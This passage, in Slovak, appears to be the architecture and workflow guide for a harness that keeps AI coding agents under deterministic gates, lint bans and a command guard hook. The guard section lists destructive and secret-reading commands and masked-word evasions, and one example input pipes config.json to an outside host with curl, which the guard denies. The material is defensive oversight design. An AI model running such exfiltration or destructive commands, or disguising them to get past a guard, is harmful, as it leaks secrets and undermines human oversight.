# Architektúra a pracovný postup Effect-TS Engineering Harness (MVP v2)

Tento dokument predstavuje autoritatívnu referenčnú príručku pre architektúru, životný cyklus úloh, rozhodovacie mechanizmy a integračné rozhrania **Effect-TS Engineering Harness (MVP v2)**. Príručka je určená pre vývojárov a autonómnych kódovacích agentov (Antigravity a Claude Code).

---

## 1. Prehľad architektúry Effect-TS Engineering Harness (MVP v2)

### 1.1 Základná filozofia: Determinizmus víťazí nad LLM

Tradičné vývojové rámce s podporou umelej inteligencie trpia halucináciami, tichým vynechávaním typových obmedzení a nestabilitou pri škálovaní kódu. Architektúra **Effect-TS Engineering Harness** stavia na nekompromisnom princípe:

> **Deterministické brány vždy vyhrávajú nad LLM (Deterministic gates always win; the decision model never overrides them).**

1. **Priorita determinizmu:** Rozhodovací model nikdy nemôže zrušiť ani obísť deterministické kontroly typu `tsc`, lintovacie pravidlá `oxlint`, štrukturálnu analýzu grafu `effect/Graph`, ani kryptografickú pečiatku repozitára `.harness/verify-stamp.json`.
2. **Poradná rola lokálneho modelu:** Rezidentný lokálny model `clef-flash` (kvantizovaný `gemma4:e4b-it-q4_K_M` bežiaci cez Ollama na porte 11434 s maximálnym timeoutom `1500 ms`) plní výhradne **poradnú (advisory)** úlohu. Slúži na smerovanie vzorov, klasifikáciu zlyhaní a eskaláciu neznámych príkazov. Ak model zlyhá, vyprší časový limit alebo je Ollama offline, systém okamžite prechádza na bezpečný deterministický fallback.
3. **Čistý a odľahčený beh:** Architektúra presadzuje **nulový Docker a nulový Python**. Celý ekosystém je postavený na modernom **Node.js 24+**, čistom **TypeScripte** a natívnych Rust NAPI rozšíreniach:
   - `@ast-grep/napi` zabezpečuje bleskovú statickú AST analýzu a štrukturálne vyhľadávanie v milisekundách.
   - `@modernrelay/omnigraph` zabezpečuje lokálny analytický property graf postavený na stĺpcovom formáte Lance bez potreby externej databázy.

---

### 1.2 Prehľad 12 balíkov v monorepe

Monorepo je spravované nástrojom **Nx** a balíčkovacím manažérom **pnpm**. Pozostáva z 12 striktne izolovaných balíkov rozdelených do infraštruktúry harnessu a ukážkovej aplikácie:

```mermaid
graph TD
    subgraph "Harness Platform (libs/harness & apps/harness-*)"
        CLI["apps/harness-cli<br/>(Riadiace CLI rozhranie)"]
        MCP["apps/harness-mcp<br/>(MCP server pre agentov)"]
        GATES["libs/harness/gates<br/>(Deterministické brány & pečiatky)"]
        DECISION["libs/harness/decision<br/>(clef-flash model & schémy)"]
        INGEST["libs/harness/ingest<br/>(AST indexácia & test tracer)"]
        GRAPH["libs/harness/graph<br/>(effect/Graph & Omnigraph sync)"]
    end

    subgraph "Sample Application (libs/sample & apps/sample-*)"
        CONTRACT["libs/sample/contract<br/>(type:contract — Schemas & APIs)"]
        SERVICE["libs/sample/service<br/>(type:service — Context.Service)"]
        DOMAIN["libs/sample/domain<br/>(type:domain — Pure logic & Deciders)"]
        INFRA["libs/sample/infra<br/>(type:infra — Drizzle, DO, Alchemy)"]
        APP["apps/sample<br/>(type:app — Cloudflare Worker & DO)"]
        WEB["apps/sample-web<br/>(type:app, scope:web — Vite + React)"]
    end

    CLI --> GATES
    CLI --> DECISION
    CLI --> INGEST
    CLI --> GRAPH

    MCP --> GRAPH
    MCP --> DECISION

    DOMAIN --> CONTRACT
    DOMAIN --> SERVICE
    SERVICE --> CONTRACT
    INFRA --> CONTRACT
    INFRA --> SERVICE
    INFRA --> DOMAIN
    APP --> INFRA
    APP --> CONTRACT
    WEB --> CONTRACT
```

#### Komponenty Harnessu (`libs/harness/*`, `apps/harness-*`)

1. **`libs/harness/gates`:**
   - Implementuje deterministické bezpečnostné pravidlá príkazov (`ALLOWLIST`, `DENYLIST`, `ASKLIST`).
   - Poskytuje skeleton helper `stub<A, E, R>(...args)`, ktorý uchováva presné typy kanálov počas plánovania.
   - Počíta rekurzívny kryptografický SHA-256 hash pracovného stromu a zapisuje/overuje `.harness/verify-stamp.json`.
   - Zabezpečuje porovnanie grafov plánu a implementácie (`diffPlanAndImplGraphs`).
2. **`libs/harness/decision`:**
   - Integruje lokálny model `clef-flash` pomocou `@effect/ai-typesafe` (`TypeSafeDecisionModel`) s timeoutom `1500 ms`.
   - Definuje 5 typovo bezpečných schém: `IdiomRouterV1`, `GuardV1`, `TriageV1`, `PlanStepCoverageV1` a `LearnProposalV1`.
3. **`libs/harness/ingest`:**
   - Využíva `@ast-grep/napi` na statickú indexáciu všetkých deklarácií `Effect.fn` v repozitári (`buildWorkspaceFnIndex`) a detekciu duplicitných názvov spanov.
   - Poskytuje testovací tracer `runWithTestTracer` a W3C `traceparent` koreláciu prepájajúcu `@effect/vitest` testy s reálnymi volaniami funkcií.
4. **`libs/harness/graph`:**
   - Zostavuje typovo orientovaný funkcionálny graf závislostí pomocou `effect/Graph` a `ts-morph` (`extractWorkspaceTypeAwareGraph`).
   - Extrahuje architektonické dokumenty ako uzly `AdrDoc` a `EarsSpec` s hranami `GovernsSymbol` a `SpecifiesSymbol` smerujúcimi na symboly kódu (`EffectFn`, `ServiceTag`, `TaggedError`).
   - Validuje architektonické invarianty (`checkEffectGraph` vrátane pravidiel `domain-requires-infra`, `domain-requires-cloud-binding`, `impure-decider`, `layer-cycle` a `unmapped-spec-symbol`).
   - Zabezpečuje obojsmernú synchronizáciu s lokálnym Omnigraphom (`OmnigraphSync`, NDJSON export, zlučovanie vetiev `plan/current` a `impl/current` do `main`).
   - Obsahuje autorizačné pravidlá Cedar (`policies.cedar`).
5. **`apps/harness-cli`:**
   - Centrálny vstupný bod pre nástroje agentov a automatizačné háky (hooks).
   - Poskytuje subpríkazy: `guard`, `route`, `plan-check`, `verify`, `done`, `ingest`, `session`, `doctor`, `learn`.
6. **`apps/harness-mcp`:**
   - Štandardný Model Context Protocol (MCP) server bežiaci cez `stdio`.
   - Sprístupňuje agentom 6 analytických nástrojov: `harness_resolve`, `harness_callers`, `harness_callees`, `harness_tests_reaching`, `harness_structural_search` a `harness_route`.

#### Komponenty Ukážkovej Aplikácie (`libs/sample/*`, `apps/sample-*`)

7. **`libs/sample/contract` (`type:contract`):**
   - Definuje zdieľané dátové schémy (`Schema.Struct`), verejné API kontrakty (`HttpApiEndpoint`, `RpcGroup`) a typované chyby (`Schema.TaggedErrorClass`).
   - Obsahuje kanonický súbor `openapi.json` a skript spätnej kompatibility `scripts/check-openapi.mjs`.
   - Importuje **výhradne** balík `effect`.
8. **`libs/sample/service` (`type:service`):**
   - Definuje abstraktné servisné identifikátory a rozhrania (`Context.Service`), napríklad `PhotoRepo` a `AlbumCounterClient`.
9. **`libs/sample/domain` (`type:domain`):**
   - Obsahuje čistú doménovú logiku, prípady použitia a rozhodovacie funkcie (`*.decide`).
   - Striktné pravidlo čistoty: decider funkcie musia mať environment `R = never` a nesmú vykonávať žiadne I/O. Nesmie importovať `type:infra` ani `alchemy`.
10. **`libs/sample/infra` (`type:infra`):**
    - Konkrétne implementácie vrstiev (`Layer.Layer`), integrácia Drizzle ORM pre Cloudflare D1 (SQLite) a Durable Objects.
    - RPC handler s propagáciou W3C `traceparent` hlavičiek a synchronizovanými transakciami Durable Objects.
    - Deklarácia cloudových zdrojov Alchemy.
11. **`apps/sample` (`type:app`):**
    - Koncová aplikácia pre Cloudflare Workers a Durable Objects. Spája jednotlivé `Layer` implementácie do spustiteľného celku cez `alchemy.run.ts`.
12. **`apps/sample-web` (`type:app`, `scope:web`):**
    - Klientska SPA aplikácia postavená na Vite a Reacte. Využíva reaktívne atómy z `@effect/atom` a typovaný klientsky wrapper `AtomHttpApi` (`SampleApiClient`). Priamy prístup k globálnemu `fetch()` je zakázaný.

---

### 1.3 Nx taxonómia a striktné architektonické hranice

Architektúra vyžaduje prísnu jednosmernú hierarchiu závislostí riadenú značkami (tags) v `package.json` a kontrolovanú linterom:

| Značka Nx | Účel a zodpovednosť | Povolené importy | Zakázané importy |
| :--- | :--- | :--- | :--- |
| `type:contract` | Zdieľané `Schema`, `HttpApi`, `RpcGroup`, doménové a API chyby | Výhradne `effect` | Akékoľvek lokálne knižnice alebo 3rd party I/O |
| `type:domain` | Prípady použitia a čisté rozhodovače (`.decide`) | `contract`, `service`, (`@harness/gates` len pre `stub` v pláne) | `type:infra`, `alchemy`, `drizzle-orm`, I/O ovládače |
| `type:service` | Servisné rozhrania (`Context.Service`), kontrakty repozitárov | `contract`, `domain` | `type:infra`, konkrétne databázové knižnice |
| `type:infra` | Živé vrstvy (`Layer.Live`), Drizzle repozitáre, RPC handlery, Alchemy zdroje | `contract`, `domain`, `service`, `infra` | Žiadne obmedzenia v rámci monorepa |
| `type:app` | Spojenie vrstiev a runtime entrypoint (`alchemy.run.ts`) | Všetky balíky monorepa | — |
| `type:app`, `scope:web` | Frontend aplikácia (Vite + React + AtomHttpApi) | `contract` a UI komponenty | `type:infra`, `type:domain`, priamy `fetch(...)` |

---

## 2. Kompletný 6-krokový životný cyklus úlohy (Workflow & Skills)

Každá zmena kódu, nová funkcia alebo oprava chyby musí prejsť striktným 6-krokovým cyklom ohraničeným deterministickými bránami.

### 2.1 Diagram životného cyklu úlohy

```mermaid
flowchart TD
    Start(["Požiadavka od používateľa"]) --> Step1["Krok 1: specifying-ears-with-effect<br/>(Prieskum grafu cez MCP & EARS špecifikácia)"]

    Step1 --> CheckEars{"Je EARS kontrakt schválený používateľom?"}
    CheckEars -- "Nie / Nejasnosti" --> Step1
    CheckEars -- "Áno" --> Step2["Krok 2: planning-effect-skeletons<br/>(Tvorba skeletonu so stub&lt;A,E,R&gt; v .ts)"]

    Step2 --> Step3["Krok 3: harness plan-check<br/>(nx affected typecheck/lint, spans, checkEffectGraph)"]

    Step3 --> CheckPlan{"plan-check úspešný? (exitCode == 0)"}
    CheckPlan -- "exit 1: Typová chyba / Duplicitný span / GraphPolicyViolation" --> FixSkeleton["Oprava skeletonu a hraníc závislostí"]
    FixSkeleton --> Step3
    CheckPlan -- "exit 0: plan-graph-snapshot.json zapísaný do plan/current" --> Step4["Krok 4: executing-effect-stubs<br/>(Implementácia subagentmi: Unit A/B/C)"]

    subgraph "Priebežné brány počas práce subagentov"
        Step4 --> GuardHook["PreToolUse Hook: harness guard<br/>(ALLOWLIST / DENYLIST / ASKLIST / clef-flash)"]
        GuardHook -- "deny (exit 2)" --> BlockAction["Zablokovanie nebezpečného príkazu"]
        GuardHook -- "allow (exit 0)" --> ExecTool["Vykonanie nástroja"]
        ExecTool --> IngestHook["PostToolUse Hook: harness ingest<br/>(Aktualizácia indexu spanov)"]
        IngestHook --> OxlintCheck["oxlint syntax-bans<br/>(Zákaz async/await, new Promise, try/catch, throw, JSON.parse)"]
        OxlintCheck --> ApiCheck["openapi:check & migration:check"]
        ApiCheck -- "exit 2: ESCALATE (Breaking change / DROP)" --> HumanEscalation["Zastavenie a eskalácia na človeka"]
    end

    ApiCheck -- "Prebieha implementácia" --> Step5["Krok 5: harness verify<br/>(Zákaz stub, checkEffectGraph, nx verify, verify-stamp.json)"]

    Step5 --> CheckVerify{"harness verify úspešný? (exitCode == 0)"}
    CheckVerify -- "exit 1: Aktívny stub / Pád testov / Linter zlyhal" --> TriageFail["Triage zlyhania (@harness/decision TriageV1)"]
    TriageFail --> FixImpl["Oprava implementácie a chýbajúcich testov"]
    FixImpl --> Step5
    CheckVerify -- "exit 0: verify-stamp.json zapísaný do impl/current" --> Step6["Krok 6: harness done / Stop Hook<br/>(SHA-256 hash stromu, diffPlanAndImplGraphs, PlanStepCoverageV1)"]

    Step6 --> CheckDone{"harness done úspešný?"}
    CheckDone -- "block / continue: Zmenené súbory po verify / Chýbajúce symboly z plánu" --> Step5
    CheckDone -- "stop / exit 0: Merge impl/current -> main v Omnigraphe" --> Done(["Úloha úspešne dokončená"])
```

---

### 2.2 Krok 1: `specifying-ears-with-effect` (Prieskum a EARS špecifikácia)

- **Vstup:** Neformálna, vágna alebo vysokoúrovňová požiadavka od používateľa.
- **Nástroje:** MCP nástroje `harness_resolve` a `harness_callers`.
- **Postup:**
  1. Agent najskôr preverí existujúci graf volaním `harness_resolve` a `harness_callers` na relevantné symboly (`EffectFn`, `ServiceTag`, `TaggedError`). Tým sa predíde duplicite existujúcich zmlúv a služieb.
  2. Ak existujú nejasnosti, agent položí používateľovi **maximálne jednu cielenú otázku** (alebo použije interaktívny dotazník `ask_question`).
  3. Výstupom je formálny kontrakt podľa metodiky **EARS (Easy Approach to Requirements Syntax)** v 5-stĺpcovej tabuľke (`| ID | Pattern | Requirement | Effect Symbol | Verification |`):
     - **Existujúci kontext grafu:** Reused Contracts / Errors, Reused Services, New Capabilities.
     - **EARS požiadavky s pomenovanými subjektmi (nikdy nie generický „the system“):**
       - `WHEN <trigger>, the <UseCase> use-case SHALL <response>` $\rightarrow$ mapuje sa na vstupné Schémy a návratový typ úspechu `A` v `Effect<A, E, R>`.
       - `IF <condition>, THEN the <UseCase> use-case SHALL fail with <TaggedError>` $\rightarrow$ mapuje sa na `Schema.TaggedErrorClass` a chybový kanál `E`.
       - `WHILE <state>, the <decider> SHALL <response>` $\rightarrow$ mapuje sa na čistý decider `Effect.fn("*.decide")` s `R = never` a overenie cez `PropertyTest`.
       - `WHERE <feature>, the <provider> SHALL <response>` $\rightarrow$ mapuje sa na `Layer` a `Config` v parametri `R`.
       - `UBIQUITOUS` $\rightarrow$ globálny invariant domény.
     - **Dotknuté balíky Nx:** Zoznam zasiahnutých knižníc v poradí `contract` $\rightarrow$ `service` $\rightarrow$ `domain` $\rightarrow$ `infra` $\rightarrow$ `web`.
  4. **Perzistencia a overenie špecifikácie (`libs/<scope>/docs/specs/YYYY-MM-DD-<slug>.md`):** Po schválení používateľom agent povinne uloží špecifikáciu do `libs/<scope>/docs/specs/YYYY-MM-DD-<slug>.md` (napr. `libs/sample/docs/specs/...`, `libs/es/docs/specs/...`, s fallbackom na koreňové `docs/specs/` len pre prierezové monorepo zmeny) so štruktúrovaným YAML frontmatterom (`id: <scope>:SPEC-NNNN`, `title`, `status: proposed`, `date`, `enforced_by`, `spans`, `services`, `errors`). Správnosť formátu a pravidiel EARS okamžite deterministicky overí čistý decider `EarsSpecLint.decide` v rámci `harness gc --strict`. Tým je garantované, že formálna EARS zmluva o správaní prežije zhustenie kontextu (`/compact`) a slúži ako pevný základ pre nasledujúce fázy.

---

### 2.3 Krok 2: `planning-effect-skeletons` (Plan-as-Code so `stub<A, E, R>()`)

- **Vstup:** Používateľom schválený trojdielny EARS kontrakt zaznamenaný v `libs/<scope>/docs/specs/` (alebo `docs/specs/`).
- **Nástroje:** MCP / CLI nástroj `harness_route` pre nájdenie relevantného vzoru v `agent-patterns/*.md`.
- **Postup:**
  - V tomto systéme **plán JE kompilovateľný kód**. Nevytvárajú sa žiadne rozsiahle textové `.md` dokumenty s neoverenými ukážkami kódu.
  - Vytvoria sa typové definície v `type:contract` (`Schema.Struct`, `TaggedError`), servisné rozhrania v `type:service` (`Context.Service`) a kostry funkcií v `type:domain` a `type:infra`.
  - Telá funkcií volajú helper `stub<A, E, R>(...args)` z balíka `@harness/gates`. Tento helper spotrebuje argumenty (aby prešiel `oxlint`) a zaistí zachovanie typovej informácie kanálov `A`, `E` a `R`:

```typescript
import { Effect } from "effect"
import { stub } from "@harness/gates"
import { PhotoNotFoundError } from "@harness/sample-contract"
import { AlbumCounterClient, PhotoRepo } from "@harness/sample-service"

// Čistý decider: R = never je povinné!
export const decideAlbumQuota = Effect.fn("AlbumQuota.decide")(function* (input: {
  readonly albumId: string
  readonly currentCount: number
}) {
  return yield* stub<number, never, never>(input)
})

// Use case s plným prepojením typov
export const deletePhoto = Effect.fn("Sample.deletePhoto")(function* (id: number) {
  return yield* stub<void, PhotoNotFoundError, PhotoRepo | AlbumCounterClient>(id)
})
```

---

### 2.4 Krok 3: `harness plan-check` (Brána plánu)

- **Spustenie:**
  ```bash
  node --import ./tools/node-ts-resolver.mjs apps/harness-cli/src/index.ts plan-check
  ```
- **Čo brána vykonáva:**
  1. Spustí `pnpm nx affected -t typecheck lint` s nastavenou premennou prostredia `HARNESS_PLAN_CHECK=1` (počas plan-checku je volanie `stub()` legálne).
  2. Spustí `buildWorkspaceFnIndex` cez `@ast-grep/napi` a overí, že každý `Effect.fn` má v celom repozitári **globálne unikátny názov spanu**.
  3. Spustí `extractWorkspaceTypeAwareGraph` (`ts-morph`) a zostaví graf volaní a závislostí vrátane uzlov `AdrDoc` a `EarsSpec` s hranami `GovernsSymbol` a `SpecifiesSymbol`.
  4. Spustí `checkEffectGraph` a overí 5 kľúčových invariantov:
     - `domain-requires-infra`: Doménová funkcia nesmie závisieť od infračervenej služby.
     - `domain-requires-cloud-binding`: Doménová funkcia nesmie priamo viazať cloudové služby (`Cloudflare`, `Alchemy`, `Drizzle`).
     - `impure-decider`: Funkcia s príponou `.decide` v `type:domain` nesmie vyžadovať žiadnu službu (`RequiresService` hrana je zakázaná, vyžaduje sa `R = never`).
     - `layer-cycle`: Detekcia cyklických závislostí medzi vrstvami pomocou `Graph.findCycle`.
     - `unmapped-spec-symbol`: Overenie, že každý span, servis a error deklarovaný v YAML frontmatteri EARS špecifikácie (aj so statusom `status: proposed`) existuje ako uzol v grafe skeletonu (`stub<A, E, R>()`).
- **Výsledok:**
  - `exit 0`: Vytlačí vizuálny Mermaid diagram do konzoly, uloží snímku `.harness/plan-graph-snapshot.json` a zapíše vetvu `plan/current` do lokálneho Omnigraphu. Agent **aktualizuje súbor `libs/<scope>/docs/specs/YYYY-MM-DD-<slug>.md`** (alebo `docs/specs/`) (doplní overený Mermaid diagram topológie a checklist Pre-Implementation Adversarial Plan Lens) a v prípade prijatia dôležitých architektonických kompromisov zaznamená záznam v `libs/<scope>/docs/adr/NNNN-<slug>.md` (so scoped `id: <scope>:ADR-NNNN`, alebo v `docs/adr/` pre celo-monorepové rozhodnutia).
  - `exit 1`: Zastavenie s chybovým hlásením. Agent sa musí vrátiť do Kroku 2 a opraviť typy alebo porušenie politík.

---

### 2.5 Krok 4: `executing-effect-stubs` (Implementácia a priebežné brány)

Keď je plán uzamknutý v grafe, nastáva implementácia:

1. **Paralelné rozdelenie podľa balíkov:**
   - **Unit A (`type:domain`):** Nahradenie `stub()` skutočnou Effect logikou, testovanie pomocou `@effect/vitest` (`it.effect`), in-memory testovacie vrstvy.
   - **Unit B (`type:infra`):** Drizzle repozitáre, Durable Objects transakcie, propagácia W3C `traceparent`.
   - **Unit C (`scope:web`):** Reakcia komponentov cez `AtomHttpApi` query a mutácie (zákaz surového `fetch`).
2. **Priebežné ochranné brány:**
   - **`PreToolUse` hook (`harness guard`):** Kontroluje každý príkaz pred spustením. Pravidlá idú v pevnom poradí (`harness:ADR-0003`):
     1. **deny:** `rm -rf`, `push --force`, `.env` ako cesta k súboru (nie `process.env`), agentom spustený `harness guard`.
     2. **ask:** `alchemy deploy/destroy/profile` a git príkazy, ktoré zahadzujú prácu (`checkout -- .`, `restore`, `reset --hard`, `stash drop`, `branch -D`, `clean`).
     3. **escalate na clef:** `find -delete/-exec`, presmerovanie výstupu `>` do súboru, zamaskované slová (`[e]nv`, `r''m`).
     4. **allow:** až potom shellové operátory a prefixový allowlist.

     Podrobnosti sú v `harness:SPEC-0001`.
   - **`PostToolUse` hook (`harness ingest`):** Po každej úprave súboru reindexuje `Effect.fn` spany pre okamžitú navigáciu.
   - **`tools/oxlint/syntax-bans.js`:**
     - Zákaz `async` / `await` $\rightarrow$ použite `Effect.gen`.
     - Zákaz `new Promise` $\rightarrow$ použite `Effect.try` / `Effect.async`.
     - Zákaz `try` / `catch` $\rightarrow$ modelujte chyby cez `Effect.catch*` / `Effect.die`.
     - Zákaz `throw` $\rightarrow$ použite `Effect.fail` / `Effect.die`.
     - Zákaz priameho `JSON.parse` $\rightarrow$ dekódujte cez `Schema.decodeUnknown*`.
     - Zákaz `stub()` v produkčnom overení.
     - Zákaz volania `fetch(...)` vo webovej aplikácii $\rightarrow$ použite `SampleApiClient`.
     - Povinné `Config.redacted` pre tajomstvá a kľúče (`SECRET`, `TOKEN`, `PASSWORD`, `API_KEY`).
     - Zákaz raw SQL template literal interpolácie v `.exec(...)` / `.prepare(...)` $\rightarrow$ použite parametrizované dotazy (`.bind(...)` alebo Drizzle `sql`).
     - Zákaz nečistých globálnych volaní (`Date.now()`, `new Date()`, `Math.random()`) a `Effect.ignore` v `type:domain`.
     - Zákaz neohraničeného `Schedule.forever` v `Effect.retry` $\rightarrow$ vyžadujú sa ohraničené Schedule s jitterom a stropom.
   - **`openapi:check` (`libs/sample/contract`):**
     - Deteguje breaking changes voči referenčnej schéme.
     - Ak dôjde k breaking zmene (napr. zmazanie poľa bez spätnej kompatibility), skript skončí s **`exit 2` a výstupom `ESCALATE`**, čo vyžaduje zásah používateľa.
   - **`migration:check` (`libs/sample/infra` & `MigrationSafety.decide`):**
     - Simuluje `drizzle-kit generate` voči dočasnej zložke a overuje SQL cez `MigrationSafety.decide`.
     - Deteguje deštruktívne SQL (`DROP TABLE`, `DROP COLUMN`, `DROP INDEX`), SQLite table rebuildy (`__new_<table_name>`) a `ALTER TABLE ... ADD COLUMN ... NOT NULL` bez `DEFAULT`.
     - Ak nová migrácia obsahuje takéto zmeny, skript skončí s **`exit 2` a výstupom `ESCALATE`**.
3. **Akceptácia špecifikácie a `harness gc --strict` (`stale-doc-reference`):**
   - Po dokončení implementácie a schválení špecializovanými recenzentmi (Multi-Lens Review) agent aktualizuje frontmatter `libs/<scope>/docs/specs/YYYY-MM-DD-<slug>.md` (alebo `docs/specs/`) z `status: proposed` na `status: accepted`.
   - Následne spustí `harness gc --strict`, kde čistý decider `GraphGc.decide` overí pravidlo `stale-doc-reference`: potvrdí, že všetky súbory v `enforced_by` a všetky symboly v `spans`/`services`/`errors` na akceptovaných špecifikáciách a ADR záznamoch (v `libs/*/docs/{adr,specs}`, `apps/*/docs/{adr,specs}` aj `docs/{adr,specs}`) reálne existujú v kóde a v grafe `HarnessGraph`.

---

### 2.6 Krok 5: `harness verify` (Jediná sankcionovaná verifikačná brána)

- **Spustenie:**
  ```bash
  CI=true node --import ./tools/node-ts-resolver.mjs apps/harness-cli/src/index.ts verify
  ```
- **Čo brána vykonáva:**
  1. **Kontrola aktívnych stubov:** Prehľadá index spanov aj celý funkcionálny graf. Ak objaví čo i len jediný `stub()`, okamžite zlyhá (`exit 1`).
  2. **Validácia grafu:** Spustí `checkEffectGraph` na overenie neporušenosti architektonických pravidiel.
  3. **Deterministické overenie projektov:** Spustí `nx affected -t verify` (`tsc --noEmit`, `oxlint`, `vitest run`, `openapi:check`, `migration:check`).
  4. **Zber telemetrie:** Testy bežiace cez `runWithTestTracer` zaznamenávajú W3C `traceparent` a vytvárajú hrany `TracedCall` a `ExercisesSpan`.
  5. **Zápis implementačného grafu:** Uloží `.harness/graph-snapshot.json` a zosynchronizuje vetvu `impl/current` v Omnigraphe.
  6. **Kryptografická pečiatka:** Vypočíta deterministický SHA-256 hash všetkých sledovaných súborov repozitára a zapíše pečať do `.harness/verify-stamp.json`:
     ```json
     {
       "treeHash": "a1b2c3d4e5f6...",
       "timestamp": "2026-10-26T12:00:00.000Z",
       "taskBranch": "impl/current"
     }
     ```

---

### 2.7 Krok 6: `harness done` / `Stop` Hook (Záverečná brána)

- **Spustenie:**
  ```bash
  node --import ./tools/node-ts-resolver.mjs apps/harness-cli/src/index.ts done
  ```
- **Čo brána kontroluje:**
  1. **Platnosť pečiatky (`checkVerifyStamp`):** Prepočíta aktuálny SHA-256 hash pracovného stromu a porovná ho s `treeHash` v `.harness/verify-stamp.json`. Ak agent po `verify` zmenil čo i len jediný znak alebo komentár, pečať je neplatná a proces je zablokovaný.
  2. **Diferenciál grafov (`diffPlanAndImplGraphs`):** Porovná `.harness/plan-graph-snapshot.json` s `.harness/graph-snapshot.json`. Ak v implementácii chýba naplánovaná funkcia, služba, chybový typ alebo hrana, brána vráti `block` (Claude Code) alebo `continue` (Antigravity).
  3. **Pokrytie krokov plánu (`PlanStepCoverageV1`):** Ak boli špecifikované kroky plánu, model `clef-flash` overí, či diff plní požiadavky a neobsahuje zmeny mimo záberu.
  4. **Zlúčenie v Omnigraphe:** Vykoná merge `impl/current -> main` v lokálnom grafe Omnigraph.
  5. **Ukončenie:** Vráti úspešné potvrdenie (`{"decision": "stop"}` v Antigravity, resp. `exit 0` a prázdny stdout v Claude Code).

---

## 3. Kedy a ako sa volá lokálny model `clef-flash` (`@harness/decision`)

Lokálny neurónový model slúži ako asistent s ultra-rýchlou odozvou, ktorý sa zapája iba na presne vymedzených miestach.

### 3.1 Sekvenčný diagram volania a deterministický fallback

```mermaid
sequenceDiagram
    autonumber
    participant Caller as "Volajúci (CLI / Hook / MCP)"
    participant Layer as "LocalDecisionModel (@harness/decision)"
    participant Ollama as "Ollama (clef-flash @ localhost:11434)"
    participant Fallback as "Deterministický Fallback"

    Caller->>Layer: DecisionModel.decide(Schema, input)
    activate Layer
    
    par Timeout preteká s inferenciou
        Layer->>Ollama: POST /v1/chat/completions (clef-flash)
        Note over Layer,Ollama: Limit: 1500 ms (1.5 sekundy)
    and Časovač (1500 millis)
        Layer->>Layer: Effect.timeoutOption("1500 millis")
    end

    alt Model odpovedal v limite (t < 1500 ms)
        Ollama-->>Layer: 200 OK (štruktúrované pravdepodobnosti / triedy)
        Layer->>Caller: Spracovaný výsledok (DecisionResult)
    else Timeout vypršal (t >= 1500 ms) alebo Ollama je offline
        Layer-->>Layer: Effect.catchCause -> succeedNone
        Layer->>Fallback: Aktivácia deterministického pravidla
        Fallback-->>Caller: Bezpečná predvolená hodnota (Fallback Value)
    end
    deactivate Layer
```

---

### 3.2 Detailný prehľad 5 rozhodovacích schém

| Rozhodovacia schéma | Kedy sa volá | Vstupné dáta | Výstupné polia a kritériá | Rozhodovacie pravidlo v kóde | Deterministický fallback (pri timeoute / offline) |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **1. `IdiomRouterV1`** (`routeStep`) | CLI `harness route` alebo MCP `harness_route` pri tvorbe skeletonu | `{ planStep: string }` | • `fitsAny`: pravdepodobnosť (0.0–1.0)<br/>• `block`: klasifikácia do 15 kategórií | Ak `fitsAny >= 0.7`, vráti sa vybraný `block`, inak `"review"` | `"review"` (žiadny vzor, manuálna kontrola) |
| **2. `GuardV1`** (`decideGuardCommand`) | CLI `harness guard` (iba ak `classifyCommand` vráti `"escalate"`) | `{ command: string }` | • `destructive`: pravdepodobnosť<br/>• `secretAccess`: pravdepodobnosť<br/>• `exfiltration`: pravdepodobnosť | Ak ľubovoľné $\ge 0.7 \rightarrow$ `"deny"`; ak všetky tri $< 0.3 \rightarrow$ `"allow"`; inak `"ask"` | **`"ask"`** (človek musí potvrdiť; **nikdy nie `"allow"`!**) |
| **3. `TriageV1`** (`triageFailure`) | Po zlyhaní `verify`, ak sa nezachytilo v statických pravidlách | `{ failureOutput: string }` | • `kind`: `"mechanical"` alebo `"semantic"` | Klasifikácia charakteru chyby pre nápovedu agentovi | `"semantic"` (odporučí analyzovať graf cez `harness_tests_reaching`) |
| **4. `PlanStepCoverageV1`** (`checkPlanStepCoverage`) | Počas `harness done`, ak boli zadané kroky `planSteps` | `{ stepId, planStep, stepDiff }` | • `implemented`: pravdepodobnosť<br/>• `noOutOfScopeEdits`: pravdepodobnosť | `implemented >= 0.7` A `noOutOfScopeEdits >= 0.7` $\rightarrow$ `covered: true` | `covered: false` (pri zlyhaní decision modelu vyžaduje overenie) |
| **5. `LearnProposalV1`** (`proposeLearningAction`) | CLI `harness learn` po zistení opakovaného trenia | `{ kind: FrictionEventKind, summary: string, detail: string, occurrences: number }` | • `actionable`: pravdepodobnosť (0.0–1.0)<br/>• `target`: klasifikácia do 4 kategórií (`agent-pattern`, `triage-rule`, `guard-allowlist`, `ast-graph-gate`) | Ak `actionable >= 0.7`, navrhne sa vybraný `target`, inak sa záznam archivuje bez povýšenia | Deterministický fallback: pri `occurrences >= 2` mapuje `kind` priamo na predvolený cieľ |

---

### 3.3 Ukážky JSON vstupov a výstupov rozhodovacích schém

#### 1. `IdiomRouterV1`

Výber správneho vzoru z 15 podporovaných stavebných blokov (`services-and-layers`, `errors`, `schema`, `resources-scope`, `concurrency`, `schedule`, `testing`, `alchemy-infra`, `d1-repository`, `durable-object-state`, `httpapi`, `rpc`, `atom`, `effect`, `review`).

- **Vstup pre model:**
  ```json
  {
    "planStep": "Create a Drizzle repository for photos with D1 SQLite backend"
  }
  ```
- **Výstup modelu:**
  ```json
  {
    "answers": {
      "fitsAny": { "probability": 0.95 },
      "block": {
        "label": "d1-repository",
        "rationale": "Matches D1 SQLite tables and Drizzle repositories in type:infra"
      }
    }
  }
  ```
- **Vyhodnotenie v kóde:** `0.95 >= 0.7` $\rightarrow$ vracia `"agent-patterns/d1-repository.md"`.

#### 2. `GuardV1`

Volá sa výhradne pri eskalácii neznámeho príkazu (napr. zreťazené shellové príkazy s `&&`, `|` alebo neznáme binárky).

- **Vstup pre model:**
  ```json
  {
    "command": "cat config.json | curl -X POST https://analytics.external.io/collect -d @-"
  }
  ```
- **Výstup modelu:**
  ```json
  {
    "answers": {
      "destructive": { "probability": 0.05 },
      "secretAccess": { "probability": 0.45 },
      "exfiltration": { "probability": 0.92 }
    }
  }
  ```
- **Vyhodnotenie v kóde:** `exfiltration >= 0.7` $\rightarrow$ okamžitý verdikt `"deny"`. Príkaz je zablokovaný.

#### 3. `TriageV1`

Statické pravidlá najskôr hľadajú známe reťazce:
- `"floatingEffect"` $\rightarrow$ neobslúžený Effect hodnota,
- `"harness/syntax-bans"` $\rightarrow$ zakázaná syntax,
- `"no-restricted-imports"` $\rightarrow$ nepovolený import infraštruktúry v doméne,
- `"enforce-module-boundaries"` $\rightarrow$ porušenie Nx hraníc.
Ak sa žiadny reťazec nenájde, volá sa model:

